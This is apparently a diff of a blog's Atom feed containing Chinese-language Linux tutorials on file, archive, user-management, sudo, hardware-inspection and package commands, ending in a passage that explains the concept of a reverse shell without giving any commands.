+<td style="text-align:left">设置每个 “块” 的大小</td>
+</tr>
+<tr>
+<td style="text-align:center">count</td>
+<td style="text-align:left">设置要复制 “块” 的个数</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>dd if=/dev/zero of=560_file count=1 bs=560M</code></p>
+<h3> file</h3>
+<p>file 用于查看文件的类型，语法格式：<code>file 文件名称</code></p>
+<p>example：</p>
+<p><code>file anaconda-ks.cfg</code></p>
+<h3> tar</h3>
+<p>tar 用于对文件进行打包压缩或解压，语法格式：<code>tar [选项] 压缩名 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">创建压缩文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">解开压缩文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">查看压缩包内的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-z</td>
+<td style="text-align:left">用 Gzip 压缩或解压</td>
+</tr>
+<tr>
+<td style="text-align:center">-j</td>
+<td style="text-align:left">用 bzip2 压缩或解压</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示压缩或解压的过程</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">目标文件名</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">保留原始的权限与属性</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">使用绝对路径来压缩</td>
+</tr>
+<tr>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">指定解压到的目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">指定的任意文件加入到归档文件中</td>
+</tr>
+<tr>
+<td style="text-align:center">--exclude</td>
+<td style="text-align:left">将匹配通配符模式的文件排除在归档过程之外</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>tar zcvf anaconda-ks.cfg.tar.gz anaconda-ks.cfg</code></p>
+<h3> zip</h3>
+<p>zip 用于对文件或目录进行压缩，语法格式：<code>zip [选项] 压缩名 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">删除 zip 文件中的条目</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">移动到 zip 文件中（删除操作系统文件）</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">递归到目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-q</td>
+<td style="text-align:left">不显示过程</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">详细信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">添加一行注释</td>
+</tr>
+<tr>
+<td style="text-align:center">-z</td>
+<td style="text-align:left">添加 zip 文件注释</td>
+</tr>
+<tr>
+<td style="text-align:center">-x "文件列表"</td>
+<td style="text-align:left">排除 "文件列表" 中文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-i "文件列表"</td>
+<td style="text-align:left">仅包括 "文件列表" 中文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-F</td>
+<td style="text-align:left">修复 zip 文件（-FF 更努力）</td>
+</tr>
+<tr>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">不添加目录项</td>
+</tr>
+<tr>
+<td style="text-align:center">-T</td>
+<td style="text-align:left">测试 zip 文件完整性</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">加密</td>
+</tr>
+<tr>
+<td style="text-align:center">-压缩级别</td>
+<td style="text-align:left">-1 压缩更快 -9 次压缩更好</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> unzip</h3>
+<p>unzip 用于解压以 <code>.zip</code> 为后缀的压缩包文件，语法格式：<code>unzip [选项] 压缩包文件</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">删除 zip 文件中的条目</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">查看压缩包文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">测试压缩包是否正确</td>
+</tr>
+<tr>
+<td style="text-align:center">-z</td>
+<td style="text-align:left">仅显示压缩包注释</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">详细信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-x "文件列表"</td>
+<td style="text-align:left">解压时排除 "文件列表" 中文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">将文件解压缩到指定目录中</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">从不覆盖现有文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-q</td>
+<td style="text-align:left">不显示过程</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">在没有提示的情况下覆盖文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">自动转换任何文本文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">匹配文件名不区分大小写</td>
+</tr>
+<tr>
+<td style="text-align:center">-L</td>
+<td style="text-align:left">使（某些）名称小写</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> Linux 系统用户命令</h2>
+<h3> id</h3>
+<p>id 用于显示用户详细信息，语法格式：<code>id 用户名</code></p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> useradd</h3>
+<p>useradd 用于创建用户账户，语法格式：<code>useradd [选项] 用户名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">指定用户家目录（默认为 /home/ 目录下）</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">账户的到期时间，格式为：YYYY-MM-DD</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">指定该用户的默认 UID</td>
+</tr>
+<tr>
+<td style="text-align:center">-g</td>
+<td style="text-align:left">指定一个初始的用户组（该组必须存在）</td>
+</tr>
+<tr>
+<td style="text-align:center">-G</td>
+<td style="text-align:left">指定一个或多个扩展用户组</td>
+</tr>
+<tr>
+<td style="text-align:center">-N</td>
+<td style="text-align:left">不创建与用户同名的基本用户组</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">指定该用户的默认 Shell 解释器</td>
+</tr>
+<tr>
+<td style="text-align:center">-M</td>
+<td style="text-align:left">不创建用户家目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">创建系统用户</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>useradd -M -s /sbin/nologin nginx</code></p>
+<h3> groupadd</h3>
+<p>groupadd 用于创建用户组，语法格式：<code>groupadd [选项] 用户组名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-g</td>
+<td style="text-align:left">指定新建工作组的 id</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">创建系统工作组，系统工作组的组 ID 小于 500</td>
+</tr>
+<tr>
+<td style="text-align:center">-K</td>
+<td style="text-align:left">覆盖配置文件 /etc/login.defs</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">允许添加组 ID 号不唯一的工作组</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 -g 一起使用，并且指定的 GID_MIN 已经存在时，选择另一个唯一的 GID（即 -g 关闭）</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>groupadd nginx</code></p>
+<h3> usermod</h3>
+<p>usermod 用于修改用户的属性，语法格式：<code>usermod [选项] 用户名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">填写用户账户的备注信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-d -m</td>
+<td style="text-align:left">选项 -m 与 -d 连用，可重新指定用户的家目录并自动把旧的数据转移过去</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">账户的到期时间，格式为 YYYY-MM-DD</td>
+</tr>
+<tr>
+<td style="text-align:center">-g</td>
+<td style="text-align:left">变更所属用户组</td>
+</tr>
+<tr>
+<td style="text-align:center">-G</td>
+<td style="text-align:left">变更扩展用户组</td>
+</tr>
+<tr>
+<td style="text-align:center">-L</td>
+<td style="text-align:left">锁定用户禁止其登录系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-U</td>
+<td style="text-align:left">解锁用户，允许其登录系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">修改用户的 UID</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">变更默认终端</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>usermod -G root zhangsan</code></p>
+<h3> passwd</h3>
+<p>passwd 用于修改用户的密码、过期时间等信息，语法格式：<code>passwd [选项] 用户名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">锁定用户，禁止用户登录</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">解除锁定，运行用户登录</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">使该用户可用空密码登录系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">强制用户在下次登录时修改密码</td>
+</tr>
+<tr>
+<td style="text-align:center">-S</td>
+<td style="text-align:left">显示用户的密码是否被锁定，以及密码所采用的加密算法名称</td>
+</tr>
+<tr>
+<td style="text-align:center">--stdin</td>
+<td style="text-align:left">允许通过标准输入修改密码</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> userdel</h3>
+<p>userdel 用于删除已有的用户，语法格式：<code>userdel [选项] 用户名</code></p>
+<blockquote>
+<p>默认保留用户家目录</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">强制删除用户</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">同时删除用户及用户家目录</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>userdel zhangsan</code></p>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">普通用户使用 sudo 时报错</title>
+    <id>https://sankgao.github.io/computer/linux/error_using_sudo.html</id>
+    <link href="https://sankgao.github.io/computer/linux/error_using_sudo.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 普通用户使用 sudo 时报错</h2>
+<p>Linux 普通用户执行 sudo 命令时，提示：<code>sudo: no tty present and no askpass program specified</code>，原因是默认新建的用户不在 sudo 组，没有开启免密，需要编辑 <code>/etc/sudoers</code> 文件将用户或用户组加入。</p>
+<p>解决方法：</p>
+<p>切换到 root 用户，执行命令 <code>visudo</code> 或者 <code>vim /etc/sudoers</code>，打开 <code>sudoers</code> 文件，在最下面一行添加</p>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 普通用户使用 sudo 时报错</h2>
+<p>Linux 普通用户执行 sudo 命令时，提示：<code>sudo: no tty present and no askpass program specified</code>，原因是默认新建的用户不在 sudo 组，没有开启免密，需要编辑 <code>/etc/sudoers</code> 文件将用户或用户组加入。</p>
+<p>解决方法：</p>
+<p>切换到 root 用户，执行命令 <code>visudo</code> 或者 <code>vim /etc/sudoers</code>，打开 <code>sudoers</code> 文件，在最下面一行添加</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>再输入 <code>:wq!</code> 保存</p>
+<h2> sudoers</h2>
+<p>sudoers 文件是用于指定特定用户或用户组像 root 用户一样使用各种各样的命令，而不需要输入 root 用户密码，语法格式：<code>user    MACHINE=COMMANDS</code> （用户 主机地址=（可以变换的身份） 可以执行的命令）。</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
+<li>第一段：用户名或者用户组，表示谁有权限来使用后面的配置。<code>%sudo</code> 代表 sudo 组下的所有用户</li>
+<li>第二段：表示来源地，即从哪执行这条命令。<code>ALL</code> 表示所有计算机</li>
+<li>第三段：表示 sudo 可以切换到什么用户。<code>ALL</code> 表示所有用户</li>
+<li>第四段：表示 sudo 可以切换到哪些组下的用户。<code>ALL</code> 表示所有组</li>
+<li>第五段：表示 sudo 之后能够执行的命令。<code>NOPASSWD:ALL</code> 表示执行任意命令都不需要输入用户密码</li>
+</ul>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">硬件资源管理</title>
+    <id>https://sankgao.github.io/computer/linux/hardware_resource.html</id>
+    <link href="https://sankgao.github.io/computer/linux/hardware_resource.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> 查看系统 PCI 设备</h2>
+<p><code>lspci</code> 用于列出所有的 PCI 设备，比如主板、声卡、显卡和网卡等，也会把 USB 接口设备显示出来，语法格式：<code>lspci [参数]</code></p>
+<p>基本显示模式：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-mm</td>
+<td style="text-align:left">生成机器可读输出（单个 -m 表示过时的格式）</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">显示总线树</td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<h2> 查看系统 PCI 设备</h2>
+<p><code>lspci</code> 用于列出所有的 PCI 设备，比如主板、声卡、显卡和网卡等，也会把 USB 接口设备显示出来，语法格式：<code>lspci [参数]</code></p>
+<p>基本显示模式：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-mm</td>
+<td style="text-align:left">生成机器可读输出（单个 -m 表示过时的格式）</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">显示总线树</td>
+</tr>
+</tbody>
+</table>
+<p>显示选项：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">冗余（-vv 或 -vvv 用于更高的冗余度）</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">显示处理每个设备的内核驱动程序</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">显示配置空间标准部分的十六进制转储</td>
+</tr>
+<tr>
+<td style="text-align:center">-xxx</td>
+<td style="text-align:left">显示整个配置空间的十六进制转储（危险；仅限 root）</td>
+</tr>
+<tr>
+<td style="text-align:center">-xxxx</td>
+<td style="text-align:left">显示 4096 字节扩展配置空间的十六进制转储（仅限 root）</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">总线中心视图（总线看到的地址和 IRQ）</td>
+</tr>
+<tr>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">始终显示域名</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">除显示总线和设备编号外，还显示网桥路径</td>
+</tr>
+<tr>
+<td style="text-align:center">-PP</td>
+<td style="text-align:left">除显示总线和设备编号外，还显示总线路径</td>
+</tr>
+</tbody>
+</table>
+<p>将设备 ID 解析为名称：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">显示数字 ID</td>
+</tr>
+<tr>
+<td style="text-align:center">-nn</td>
+<td style="text-align:left">显示文本和数字 ID（名称和数字）</td>
+</tr>
+<tr>
+<td style="text-align:center">-q</td>
+<td style="text-align:left">通过 DNS 查询 PCI ID 数据库中的未知 ID</td>
+</tr>
+<tr>
+<td style="text-align:center">-qq</td>
+<td style="text-align:left">同上，但重新查询本地缓存的条目</td>
+</tr>
+<tr>
+<td style="text-align:center">-Q</td>
+<td style="text-align:left">通过 DNS 查询 PCI ID 数据库中的所有 ID</td>
+</tr>
+</tbody>
+</table>
+<p>设备选择：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>-s[[[[&lt;domain&gt;]：]&lt;bus&gt;]：][&lt;slot&gt;][.[&lt;func&gt;]]</code></td>
+<td style="text-align:left">仅显示选定插槽中的设备</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-d[&lt;vendor&gt;]：[&lt;device&gt;][：&lt;class&gt;]</code></td>
+<td style="text-align:left">仅显示具有指定 ID 的设备</td>
+</tr>
+</tbody>
+</table>
+<p>其他选项：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>-i&lt;file&gt;</code></td>
+<td style="text-align:left">使用指定的 ID 数据库，而不是 /usr/share/hwdata/pci.ids</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-p&lt;file&gt;</code></td>
+<td style="text-align:left">在给定文件中查找内核模块，而不是默认 mode.pcimap</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-M</code></td>
+<td style="text-align:left">启用 “总线映射” 模式（危险；仅限 root）</td>
+</tr>
+</tbody>
+</table>
+<p>PCI 访问选项：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>-A&lt;method&gt;</code></td>
+<td style="text-align:left">使用指定的 PCI 访问方法（有关列表，请参见 “-A help”）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-O&lt;par&gt;=&lt;val&gt;</code></td>
+<td style="text-align:left">设置 PCI 访问参数（有关列表，请参见 “-O help”）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-G</code></td>
+<td style="text-align:left">启用 PCI 访问调试</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-H&lt;mode&gt;</code></td>
+<td style="text-align:left">使用直接硬件访问（<code>&lt;mode&gt;=1</code> 或 2）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-F&lt;file&gt;</code></td>
+<td style="text-align:left">从给定文件读取 PCI 配置转储</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查看 CPU 信息</h2>
+<blockquote>
+<p>在 siblings 和 cpu cores 值之间有个对应关系，如果 siblings 是 cpu cores 的两倍，则说明系统支持超线程，并且超线程已打开；如果 siblings 和 cpu cores 一致，则说明系统不支持超线程，或者超线程未打开</p>
+</blockquote>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> 查看物理 CPU 的个数</h3>
+<p><code>cat /proc/cpuinfo | grep "physical id" | uniq | wc -l</code></p>
+<h3> 查看每个物理 CPU 中内核的个数</h3>
+<p><code>cat /proc/cpuinfo | grep "cpu cores" | uniq</code></p>
+<h3> 查看系统所有逻辑 CPU 个数（所有物理 CPU 中内核的个数加上超线程个数），可通过如下命令查看。</h3>
+<p><code>cat /proc/cpuinfo | grep "processor" | wc -l</code></p>
+<h2> 查看系统内存信息</h2>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查看磁盘分区信息</h2>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">安装软件的方法</title>
+    <id>https://sankgao.github.io/computer/linux/install_software.html</id>
+    <link href="https://sankgao.github.io/computer/linux/install_software.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> RPM 安装</h2>
+<p>常用的 RPM 命令：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">rpm -ivh filename.rpm</td>
+<td style="text-align:center">安装软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -Uvh filename.rpm</td>
+<td style="text-align:center">升级软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -e filename.rpm</td>
+<td style="text-align:center">卸载软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qpi filename.rpm</td>
+<td style="text-align:center">查询软件描述信息</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qpl filename.rpm</td>
+<td style="text-align:center">列出软件文件信息</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qf filename.rpm</td>
+<td style="text-align:center">查询文件属于哪个 RPM</td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<h2> RPM 安装</h2>
+<p>常用的 RPM 命令：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">rpm -ivh filename.rpm</td>
+<td style="text-align:center">安装软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -Uvh filename.rpm</td>
+<td style="text-align:center">升级软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -e filename.rpm</td>
+<td style="text-align:center">卸载软件</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qpi filename.rpm</td>
+<td style="text-align:center">查询软件描述信息</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qpl filename.rpm</td>
+<td style="text-align:center">列出软件文件信息</td>
+</tr>
+<tr>
+<td style="text-align:center">rpm -qf filename.rpm</td>
+<td style="text-align:center">查询文件属于哪个 RPM</td>
+</tr>
+</tbody>
+</table>
+<h2> YUM 安装</h2>
+<p>常用的 YUM 命令：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">yum repolist all</td>
+<td style="text-align:center">列出所有仓库</td>
+</tr>
+<tr>
+<td style="text-align:center">yum list all</td>
+<td style="text-align:center">列出仓库所有软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum info 软件包名称</td>
+<td style="text-align:center">查看软件包信息</td>
+</tr>
+<tr>
+<td style="text-align:center">yum install 软件包名称</td>
+<td style="text-align:center">安装软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum reinstall 软件包名称</td>
+<td style="text-align:center">重新安装软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum update 软件包名称</td>
+<td style="text-align:center">升级软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum remove 软件包名称</td>
+<td style="text-align:center">移除软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum clean all</td>
+<td style="text-align:center">清除所有仓库缓存</td>
+</tr>
+<tr>
+<td style="text-align:center">yum check-update</td>
+<td style="text-align:center">检查可更新的软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum grouplist</td>
+<td style="text-align:center">查看系统中已经安装的软件包</td>
+</tr>
+<tr>
+<td style="text-align:center">yum groupinstall 软件包组</td>
+<td style="text-align:center">安装指定的软件包组</td>
+</tr>
+<tr>
+<td style="text-align:center">yum groupremove 软件包组</td>
+<td style="text-align:center">移除指定的软件包组</td>
+</tr>
+<tr>
+<td style="text-align:center">yum groupinfo  软件包组</td>
+<td style="text-align:center">查询指定的软件包组信息</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">反弹 Shell</title>
+    <id>https://sankgao.github.io/computer/linux/rebound_shell.html</id>
+    <link href="https://sankgao.github.io/computer/linux/rebound_shell.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> 什么是 Shell</h2>
+<p>Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p>
+<h2> 什么是反弹 Shell</h2>
+<p>其英文名叫做 Reverse Shell，就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p>
+<p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。</p>]]></summary>
+    <content type="html"><![CDATA[<h2> 什么是 Shell</h2>
+<p>Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p>
+<h2> 什么是反弹 Shell</h2>
+<p>其英文名叫做 Reverse Shell，就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p>
